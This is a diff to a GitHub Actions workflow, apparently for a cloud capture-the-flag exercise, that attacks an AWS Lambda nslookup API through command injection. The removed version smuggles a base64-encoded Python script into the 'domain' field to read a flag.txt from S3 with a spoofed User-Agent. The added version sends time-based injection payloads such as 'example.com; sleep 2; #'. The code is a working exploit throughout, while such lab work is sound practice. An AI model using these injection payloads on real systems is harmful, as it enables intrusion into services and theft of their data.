@@ -1,4 +1,4 @@
-name: Stage2-Calibration
+name: Stage2-Isolate-Command
 
 on:
   push:
@@ -11,7 +11,7 @@ permissions:
   contents: read
 
 jobs:
-  calibration:
+  isolate:
     runs-on: ubuntu-latest
 
     steps:
@@ -21,7 +21,7 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Calibrate S3 read timing
+      - name: Isolate Lambda command execution
         shell: bash
         run: |
           set +e
@@ -29,7 +29,6 @@ jobs:
           python3 -m pip install boto3 requests requests-aws4auth --quiet
 
           python3 - <<'PY'
-          import base64
           import shlex
           import time
           import requests
@@ -37,30 +36,6 @@ jobs:
           from requests_aws4auth import AWS4Auth
 
           API = "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"
-          S3_URL = "https://s3.us-east-1.amazonaws.com/userad88e2b168aa387e/flag.txt"
-          USER_AGENT = "Amazon CloudFront"
-
-          inner = r'''
-          import sys
-          import time
-          import urllib.request
-
-          url = sys.argv[1]
-          ua = sys.argv[2]
-
-          request = urllib.request.Request(
-              url,
-              headers={"User-Agent": ua}
-          )
-
-          with urllib.request.urlopen(request, timeout=10) as response:
-              data = response.read()
-
-          print("READ_BYTES=" + str(len(data)))
-          time.sleep(2)
-          '''
-
-          encoded = base64.b64encode(inner.encode()).decode()
 
           credentials = boto3.Session().get_credentials().get_frozen_credentials()
 
@@ -72,30 +47,47 @@ jobs:
               session_token=credentials.token
           )
 
-          command = (
-              "example.com; "
-              "printf '%s' "
-              + shlex.quote(encoded)
-              + " | base64 -d > /tmp/s3_probe.py; "
-              + "python3 /tmp/s3_probe.py "
-              + shlex.quote(S3_URL)
-              + " "
-              + shlex.quote(USER_AGENT)
-              + "; #"
-          )
+          tests = [
+              (
+                  "shell_sleep",
+                  "example.com; sleep 2; #"
+              ),
+              (
+                  "python_sleep",
+                  "example.com; python3 -c "
+                  + shlex.quote("import time; time.sleep(2)")
+                  + "; #"
+              ),
+              (
+                  "python_path_sleep",
+                  "example.com; /var/lang/bin/python3 -c "
+                  + shlex.quote("import time; time.sleep(2)")
+                  + "; #"
+              )
+          ]
 
-          started = time.monotonic()
+          for name, command in tests:
+              started = time.monotonic()
 
-          response = requests.post(
-              API,
-              json={"domain": command},
-              auth=auth,
-              timeout=20
-          )
+              try:
+                  response = requests.post(
+                      API,
+                      json={"domain": command},
+                      auth=auth,
+                      timeout=20
+                  )
 
-          elapsed = time.monotonic() - started
+                  elapsed = time.monotonic() - started
 
-          print("HTTP=" + str(response.status_code))
-          print("ELAPSED=%.2f" % elapsed)
-          print(response.text)
+                  print("TEST=" + name)
+                  print("HTTP=" + str(response.status_code))
+                  print("ELAPSED=%.2f" % elapsed)
+                  print("---")
+
+              except Exception as error:
+                  elapsed = time.monotonic() - started
+                  print("TEST=" + name)
+                  print("ERROR=" + repr(error))
+                  print("ELAPSED=%.2f" % elapsed)
+                  print("---")
           PY
